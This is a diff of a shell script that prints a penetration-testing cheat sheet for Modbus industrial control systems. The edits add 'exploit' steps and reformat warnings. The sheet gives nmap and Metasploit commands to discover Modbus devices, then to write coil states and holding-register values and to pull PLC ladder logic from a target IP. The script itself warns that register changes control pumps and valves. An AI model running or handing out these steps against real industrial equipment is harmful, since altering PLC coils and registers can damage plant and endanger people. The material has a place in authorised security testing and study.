@@ -162,15 +162,14 @@ echo '
 	// nmap //
   		nmap --script modbus-discover -p 502 -oN '"${ip}"'-p502-nmap-modbus-discover.txt '"${ip}"'
 	
-	// msfconsole //
- 	https://www.hackers-arise.com/post/2018/10/22/metasploit-basics-part-16-metasploit-scada-hacking
+	// msfconsole // https://www.hackers-arise.com/post/2018/10/22/metasploit-basics-part-16-metasploit-scada-hacking //
 		-Search for Modbus modules:
 			msf > search modbus
 		
   		-To check if target is running Modbus:
 			msf > use auxiliary/scanner/scada/modbusdetect
    
-		-To grab banner:
+		-To Grab Banner:
   			msf > use auxiliary/scanner/scada/modbus_banner_grabbing
   		-Next, find the Unit ID of the connected devices; its like a ping sweep:
 			To communicate with any Modbus device, we need to have its Unit ID
@@ -192,18 +191,23 @@ echo '
 	  		msf > set DATA 1
 	 			(only 1 or 0 are valid values)
 	 			(In SCADA/ICS, coils are devices that are either ON or OFF which are 1 or 0)
+			msf > exploit
+			
+   			Then can check if its successfully modified with set ACTION READ_COILS.
 			msf > set ACTION READ_COILS
-			Then can check if its successfully modified with set ACTION READ_COILS.
+   			msf > exploit
+			
    		
-	 	-To write values in the registers:
-   			[!] These are memory areas that hold values used within the device to set such things as how long to run a pump or at what pressure should a valve open. Changing these values could have dire repercussions! [!]
+	 	-To Write Values in the Registers:
+   			[!] These are memory areas that hold values used in the device for settings like how long to run pump or what pressure would a valve open [!]
+			[!] Changing these values could have dire repercussions! [!]
 	  
    			msf > set ACTION WRITE_REGISTERS
 			msf > set DATA 27,27,27,27,27
 			msf > exploit
    			Check with set ACTION READ_REGISTERS
 	  
-		-Also, check if can download the PLC Ladder Logic:
+		-Also, Check if can download the PLC Ladder Logic:
 			msf > use auxiliary/admin/scada/modicon_stux_transfer
 			msf > set MODE RECV
    			msf > set RHOST '"${ip}"'
